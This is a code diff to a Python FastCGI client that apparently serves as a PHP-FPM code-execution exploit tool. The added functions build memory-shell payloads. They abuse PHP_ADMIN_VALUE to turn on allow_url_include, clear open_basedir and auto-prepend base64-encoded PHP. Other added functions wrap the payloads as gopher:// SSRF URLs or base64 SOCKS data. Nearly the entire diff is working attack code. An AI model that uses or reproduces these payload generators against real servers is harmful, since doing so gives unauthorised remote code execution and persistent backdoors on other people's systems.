@@ -203,11 +203,42 @@ class FastCGIClient:
         return "fastcgi connect host:{} port:{}".format(self.host, self.port)
 
 
-def generate_code_payload(host, port, phpcode):
+def generate_memshell_payload(host, port, phpcode, php_file_path):
     client = FastCGIClient(host, port, 3, 0)
     params = dict()
     documentRoot = "/"
-    uri = "/var/www/html/index.php"  # TODO remove this
+    uri = php_file_path
+    content = ""
+    phpcode = "<?php " + phpcode + ";?>"
+    phpcode = force_text(base64.b64encode(phpcode.encode()))
+    params = {
+        'GATEWAY_INTERFACE': 'FastCGI/1.0',
+        'REQUEST_METHOD': 'POST',
+        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
+        'SCRIPT_NAME': uri,
+        'QUERY_STRING': '',
+        'REQUEST_URI': uri,
+        'DOCUMENT_ROOT': documentRoot,
+        'SERVER_SOFTWARE': 'php/fcgiclient',
+        'REMOTE_ADDR': '127.0.0.1',
+        'REMOTE_PORT': '11451',
+        'SERVER_ADDR': '127.0.0.1',
+        'SERVER_PORT': '80',
+        'SERVER_NAME': "localhost",
+        'SERVER_PROTOCOL': 'HTTP/1.1',
+        'CONTENT_TYPE': 'application/text',
+        'CONTENT_LENGTH': "%d" % len(content),
+        'PHP_VALUE': '',
+        'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nauto_prepend_file = "data://text/plain;base64,%s"' % (phpcode)
+    }
+    return client.request(params, content)
+
+
+def generate_code_payload(host, port, phpcode, php_file_path):
+    client = FastCGIClient(host, port, 3, 0)
+    params = dict()
+    documentRoot = "/"
+    uri = php_file_path
     phpcode = "<?php " + phpcode + ";?>"
     params = {
         'GATEWAY_INTERFACE': 'FastCGI/1.0',
@@ -232,11 +263,11 @@ def generate_code_payload(host, port, phpcode):
     return client.request(params, phpcode)
 
 
-def generate_raw_payload(host, port, extension_path):
+def generate_raw_payload(host, port, extension_path, php_file_path):
     client = FastCGIClient(host, port, 3, 0)
     params = dict()
     documentRoot = "/"
-    uri = "/var/www/html/index.php"  # TODO remove this
+    uri = php_file_path
     content = ""
     params = {
         'GATEWAY_INTERFACE': 'FastCGI/1.0',
@@ -261,28 +292,45 @@ def generate_raw_payload(host, port, extension_path):
     return client.request(params, content)
 
 
-def generate_ssrf_code_payload(host, port, phpcode):
-    raw_payload = generate_code_payload(host, port, phpcode)
+def generate_ssrf_memshell_payload(host, port, extension_path, php_file_path):
+    raw_payload = generate_memshell_payload(
+        host, port, extension_path, php_file_path)
     request_ssrf = urlparse.quote(raw_payload)
     return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
 
 
-def generate_ssrf_payload(host, port, extension_path):
-    raw_payload = generate_raw_payload(host, port, extension_path)
+def generate_ssrf_code_payload(host, port, phpcode, php_file_path):
+    raw_payload = generate_code_payload(host, port, phpcode, php_file_path)
     request_ssrf = urlparse.quote(raw_payload)
     return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
 
 
-def generate_base64_socks_code_payload(host, port, phpcode, urlencode=False):
-    raw_payload = generate_code_payload(host, port, phpcode)
+def generate_ssrf_payload(host, port, extension_path, php_file_path):
+    raw_payload = generate_raw_payload(
+        host, port, extension_path, php_file_path)
+    request_ssrf = urlparse.quote(raw_payload)
+    return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
+
+
+def generate_base64_socks_memshell_payload(host, port, phpcode, php_file_path, urlencode=False):
+    raw_payload = generate_memshell_payload(host, port, phpcode, php_file_path)
     data = force_text(base64.b64encode(raw_payload))
     if urlencode:
         data = urlparse.quote(data)
     return data
 
 
-def generate_base64_socks_payload(host, port, extension_path, urlencode=False):
-    raw_payload = generate_raw_payload(host, port, extension_path)
+def generate_base64_socks_code_payload(host, port, phpcode, php_file_path, urlencode=False):
+    raw_payload = generate_code_payload(host, port, phpcode, php_file_path)
+    data = force_text(base64.b64encode(raw_payload))
+    if urlencode:
+        data = urlparse.quote(data)
+    return data
+
+
+def generate_base64_socks_payload(host, port, extension_path, php_file_path, urlencode=False):
+    raw_payload = generate_raw_payload(
+        host, port, extension_path, php_file_path)
     data = force_text(base64.b64encode(raw_payload))
     if urlencode:
         data = urlparse.quote(data)
@@ -315,18 +363,18 @@ def generate_extension(ext_name, ext_path, command):
         return bytes(data)
 
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(
-        description='Php-fpm code execution vulnerability client.')
-    parser.add_argument('host', help='Target host, such as 127.0.0.1')
-    parser.add_argument(
-        'file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
-    parser.add_argument('-c', '--code', help='What php code your want to execute',
-                        default='<?php phpinfo(); exit; ?>')
-    parser.add_argument('-p', '--port', help='FastCGI port',
-                        default=9000, type=int)
+# if __name__ == '__main__':
+#     parser = argparse.ArgumentParser(
+#         description='Php-fpm code execution vulnerability client.')
+#     parser.add_argument('host', help='Target host, such as 127.0.0.1')
+#     parser.add_argument(
+#         'file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
+#     parser.add_argument('-c', '--code', help='What php code your want to execute',
+#                         default='<?php phpinfo(); exit; ?>')
+#     parser.add_argument('-p', '--port', help='FastCGI port',
+#                         default=9000, type=int)
 
-    args = parser.parse_args()
-    print(generate_base64_socks_payload(
-        args.host, args.port, args.file, args.code))
-    print(generate_ssrf_payload(args.host, args.port, args.file, args.code))
+#     args = parser.parse_args()
+#     print(generate_base64_socks_payload(
+#         args.host, args.port, args.file, args.code))
+#     print(generate_ssrf_payload(args.host, args.port, args.file, args.code))
